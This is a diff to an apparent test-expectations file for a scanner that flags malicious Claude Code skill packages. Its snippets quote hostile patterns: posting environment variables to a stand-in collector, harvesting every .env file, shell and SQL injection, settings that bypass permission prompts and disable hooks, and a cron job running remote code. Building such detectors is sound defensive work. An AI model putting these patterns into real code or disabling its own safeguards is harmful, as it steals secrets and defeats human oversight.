@@ -75,7 +75,7 @@ units:
     expect:
       - code: JR-S03
         path: units/mal-s03-b/.claude/skills/changelog-gen/scripts/changelog.py
-        contains: "urllib.request.urlopen(urllib.request.Request(\"https://collect.example/env\""
+        contains: 'urllib.request.urlopen(urllib.request.Request("https://collect.example/env"'
         min_severity: critical
     clean_categories: []
     note: "Environment variables are posted to an undeclared collector."
@@ -115,7 +115,7 @@ units:
     expect:
       - code: JR-S04
         path: units/mal-s04-c/.claude/skills/env-lint/scripts/scan.py
-        contains: "glob.glob(os.path.expanduser(\"~/**/.env\"), recursive=True)"
+        contains: 'glob.glob(os.path.expanduser("~/**/.env"), recursive=True)'
         min_severity: high
     clean_categories: []
     note: "Sort checker dumps every .env file under the home directory."
@@ -145,7 +145,7 @@ units:
     expect:
       - code: JR-S05
         path: units/mal-s05-c/.claude/skills/pr-branch/scripts/branch.js
-        contains: "execSync(\"git checkout -b \" + title"
+        contains: 'execSync("git checkout -b " + title'
         min_severity: high
     clean_categories: []
     note: "PR title written by others is concatenated into a shell command string."
@@ -155,7 +155,7 @@ units:
     expect:
       - code: JR-S06
         path: units/mal-s06-a/.claude/settings.json
-        contains: "\"defaultMode\": \"bypassPermissions\""
+        contains: '"defaultMode": "bypassPermissions"'
         min_severity: high
     clean_categories: []
     note: "Settings bypass every permission prompt and allow everything."
@@ -175,7 +175,7 @@ units:
     expect:
       - code: JR-S06
         path: units/mal-s06-c/.claude/skills/code-format/scripts/prepare.py
-        contains: "settings[\"disableAllHooks\"] = True"
+        contains: 'settings["disableAllHooks"] = True'
         min_severity: high
     clean_categories: []
     note: "Formatter rewrites its own settings: wildcard Bash and hooks disabled."
@@ -235,7 +235,7 @@ units:
     expect:
       - code: JR-S08
         path: units/mal-s08-c/.claude/skills/ticket-lookup/scripts/lookup.py
-        contains: "cur.execute(f\"SELECT id, total FROM orders WHERE note = '{body}'\")"
+        contains: 'cur.execute(f"SELECT id, total FROM orders WHERE note = ''{body}''")'
         min_severity: medium
     clean_categories: []
     note: "Fetched ticket text is interpolated into SQL (chain: SKILL.md fetch -> script sink)."
@@ -255,7 +255,7 @@ units:
     expect:
       - code: JR-S09
         path: units/mal-s09-b/.claude/skills/nightly-fetch/scripts/schedule.py
-        contains: "subprocess.run([\"crontab\", \"-\"]"
+        contains: 'subprocess.run(["crontab", "-"]'
         min_severity: high
     clean_categories: []
     note: "Installs a recurring cron job that fetches and runs remote code."
